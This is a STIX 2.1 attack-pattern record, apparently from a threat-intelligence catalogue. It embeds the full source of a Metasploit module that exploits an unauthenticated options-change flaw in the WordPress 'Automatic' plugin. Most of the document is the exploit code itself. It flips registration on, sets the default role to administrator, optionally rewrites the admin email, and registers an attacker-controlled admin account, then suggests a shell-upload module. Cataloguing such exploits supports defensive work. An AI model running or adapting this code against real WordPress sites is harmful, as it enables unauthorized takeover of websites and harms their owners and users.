{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--47c22b52-3a0b-4574-b0f0-0af339c7cdf2",
    "created": "2024-08-14T16:23:43.748146Z",
    "modified": "2024-08-14T16:23:43.74815Z",
    "name": "WordPress Plugin Automatic Config Change to RCE",
    "description": " This module exploits an unauthenticated arbitrary wordpress options change vulnerability in the Automatic (wp-automatic) plugin <= 3.53.2. If WPEMAIL is provided, the administrator's email address will be changed. User registration is enabled, and default user role is set to administrator. A user is then created with the USER name set. A valid EMAIL is required to get the registration email (not handled in MSF).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/wp_automatic_plugin_privesc.rb",
            "external_id": "wp_automatic_plugin_privesc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.nintechnet.com/critical-vulnerability-fixed-in-wordpress-automatic-plugin/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress Plugin Automatic Config Change to RCE',\n        'Description' => %q{\n          This module exploits an unauthenticated arbitrary wordpress options change vulnerability\n          in the Automatic (wp-automatic) plugin <= 3.53.2. If WPEMAIL is provided, the administrator's email\n          address will be changed. User registration is\n          enabled, and default user role is set to administrator. A user is then created with\n          the USER name set. A valid EMAIL is required to get the registration email (not handled in MSF).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # Metasploit module\n          'Jerome Bruandet'\n        ],\n        'DisclosureDate' => '2021-09-06',\n        'Platform' => 'php',\n        'Arch' => ARCH_PHP,\n        'Targets' => [['WordPress', {}]],\n        'DefaultTarget' => 0,\n        'References' => [\n          ['URL', 'https://blog.nintechnet.com/critical-vulnerability-fixed-in-wordpress-automatic-plugin/']\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS],\n          'NOCVE' => ['Patched in 3.53.3 without vendor disclosure']\n        }\n      )\n    )\n    register_options [\n      OptString.new('EMAIL', [true, 'Email for registration', nil, nil, URI::MailTo::EMAIL_REGEXP]),\n      OptString.new('USER', [true, 'Username for registration', 'msfuser'])\n    ]\n\n    register_advanced_options [\n      OptString.new('WPEMAIL', [false, 'Wordpress Administration Email (default: no email modification)', nil, nil, URI::MailTo::EMAIL_REGEXP])\n    ]\n  end\n\n  def check\n    return Exploit::CheckCode::Safe('Wordpress not detected.') unless wordpress_and_online?\n\n    # this is for pickup into the vulnerable plugins list\n    # check_plugin_version_from_readme('wp-automatic', '3.53.3')\n\n    if set_wp_option(Rex::Text.rand_text_numeric(8..20), Rex::Text.rand_text_numeric(8..20))\n      checkcode = Exploit::CheckCode::Vulnerable\n    else\n      checkcode = Exploit::CheckCode::Safe\n      print_error('Automatic not a vulnerable version')\n    end\n    checkcode\n  end\n\n  def set_wp_option(key, value)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'wp-automatic', 'process_form.php'),\n      'headers' => { 'X-Requested-With' => 'XMLHttpRequest' },\n      'vars_post' => { key => value },\n      'keep_cookies' => true\n    })\n    fail_with(Failure::Unreachable, 'Site not responding') unless res\n    res && res.code == 200 && res.body.include?('{\"status\":\"success\"}')\n  end\n\n  def run\n    # lots of copy pasta from wp_gdpr_compliance_privesc\n    if datastore['WPEMAIL'].present?\n      print_warning(\"Changing admin e-mail address to #{datastore['WPEMAIL']}...\")\n      fail_with(Failure::UnexpectedReply, 'Failed to change the admin e-mail address') unless set_wp_option('admin_email', datastore['WPEMAIL'])\n    end\n\n    print_status('Enabling user registrations...')\n    fail_with(Failure::UnexpectedReply, 'Failed to enable user registrations') unless set_wp_option('users_can_register', '1')\n\n    print_status('Setting the default user role type to administrator...')\n    fail_with(Failure::UnexpectedReply, 'Failed to set the default user role') unless set_wp_option('default_role', 'administrator')\n\n    print_status(\"Registering #{datastore['USER']} with email #{datastore['EMAIL']}\")\n    fail_with(Failure::UnexpectedReply, 'Failed to register user') unless datastore['EMAIL'].present? && wordpress_register(datastore['USER'], datastore['EMAIL'])\n\n    vprint_good('For a shell: use exploits/unix/webapp/wp_admin_shell_upload')\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-09-06",
    "x_mitre_platforms": [
        "php'"
    ]
}